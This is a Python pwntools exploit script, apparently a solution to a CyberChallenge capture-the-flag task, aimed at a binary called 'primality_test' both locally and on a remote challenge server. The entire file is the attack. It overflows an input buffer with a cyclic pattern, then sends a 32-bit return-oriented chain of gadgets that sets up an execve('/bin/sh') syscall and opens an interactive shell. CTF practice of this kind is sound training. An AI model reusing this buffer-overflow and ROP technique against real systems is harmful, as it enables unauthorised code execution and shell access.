#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('primality_test')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("roptest.challs.cyberchallenge.it", 6010, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x804872d
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

main_addr = 0x804872d
bin_sh_addr = exe.address + 0x991
addr_size = 4

io = start()

vector = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaxxxxxx"

pop_eax_int = 0x08048606 #pop eax; int 0x80;
pop_ebx_ret = 0x08048435 #pop ebx; ret;
pop_ebx_ecx_ret = 0x08048609 #pop ebx; pop ecx; ret;
pop_ecx_ret = 0x0804860a #pop ecx; ret;
pop_edx_ret = 0x0804860c #pop edx; ret;
pop_esi_edi_ebp_ret = 0x08048959 #pop esi; pop edi; pop ebp; ret;
inc_ecx_ret = 0x08048bb4 #inc ecx; ret;
inc_edi_ret = 0x08048c07 #inc edi; ret;
inc_edx_ret = 0x08048b81 #inc edx; add ebp, eax; ret;

payload = dict()

payload[addr_size*0] = pop_edx_ret
payload[addr_size*1] = p32(0x0)
payload[addr_size*2] = pop_ebx_ecx_ret
payload[addr_size*3] = bin_sh_addr
payload[addr_size*4] = p32(0x0)
payload[addr_size*5] = pop_eax_int
payload[addr_size*6] = p32(0x0b)

payload = fit(payload)

io.recvuntil("Enter a number:")
io.sendline(vector + payload)

io.interactive()
